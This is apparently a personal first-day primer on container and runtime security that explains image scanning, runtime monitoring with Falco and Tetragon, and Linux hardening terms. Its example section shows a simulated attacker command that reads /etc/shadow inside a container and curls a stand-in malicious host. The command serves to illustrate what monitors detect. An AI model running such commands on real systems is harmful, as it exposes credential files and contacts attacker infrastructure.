# Container & Runtime Security — quick primer

> First-day notes on Container & Runtime Security. What it is, why it matters, and the key ideas to know.

## What is it?

Container security is about keeping containerized workloads safe — both the images themselves and what those containers do while running. Runtime security specifically watches what containers do after they start: process execution, file access, network connections.

I think of it as two different problems. Image security asks "is this thing safe to run?" — scanning layers for known vulnerabilities and misconfigurations before deployment. Runtime security asks "is this thing behaving badly?" — monitoring system calls and network traffic after the container starts.

## Why does it matter for DevSecOps?

Containers change the security model compared to bare-metal or VM deployments. With VMs, each guest has its own kernel, so a breakout is harder. Containers share the host kernel, so a container escape or a malicious process inside a container can compromise the whole node.

Runtime security matters because not all threats come from the image. A container that gets compromised after startup (think Log4Shell) starts behaving differently — spawning shells, writing to unexpected files, connecting to strange IPs. Image scanning wouldn't catch that because the image itself was benign.

## Key terminology

- **Image layer** — A read-only snapshot of filesystem changes that makes up a container image. Each Dockerfile instruction adds a layer. Vulnerabilities live in layers.
- **Container escape** — Breaking out of the container sandbox to access the host OS. Example: exploiting a kernel vulnerability from inside a container to run commands on the host.
- **Syscall (system call)** — How a program requests something from the kernel (open a file, spawn a process, make a network connection). Falco watches syscalls to detect suspicious behavior.
- **Seccomp** — A Linux security feature that restricts which syscalls a process can make. Example: blocking `mount` syscalls in a container that shouldn't mount filesystems.
- **Capability** — A granular permission in Linux (like `CAP_NET_RAW` for raw sockets). Containers should drop all capabilities except the bare minimum.
- **ReadOnlyRootFilesystem** — A container security context setting that prevents writes to the container's filesystem. Blocks malware from dropping files even if it gets in.
- **eBPF** — A Linux kernel technology that lets you run sandboxed programs in kernel space. Used by Cillium, Tetragon, and Falco for high-performance observability and security monitoring.
- **Privileged container** — A container running with all capabilities and host-level access. Almost never needed and a massive red flag.

## A concrete example

Here's a small example of what runtime monitoring looks like. I run a container that opens a shell inside a running web app — a common first step in an attack:

```bash
# Start a benign nginx container
docker run --name web -d nginx:alpine

# Some attacker gets in and starts exploring
docker exec -it web sh -c "cat /etc/shadow; curl http://malicious.example.com"
```

A runtime security tool like Falco or Tetragon watching syscalls on this host would see:
- shell spawned inside a container (unexpected for nginx)
- read of `/etc/shadow` from inside the container
- outbound connection to an unknown external IP

Each of those events gets logged with container metadata, and an alert fires. Image scanning wouldn't have caught this — the nginx image was clean. The attack happened at runtime.

## How this connects to what's next

Image scanning (Trivy, Grype, Syft) covers pre-deployment safety. Runtime security (Falco, Tetragon) covers post-deployment behavior. Pipeline hardening (Cosign) ensures the image you scanned is the one that actually runs. Understanding all three layers is what lets me build a complete container security workflow.
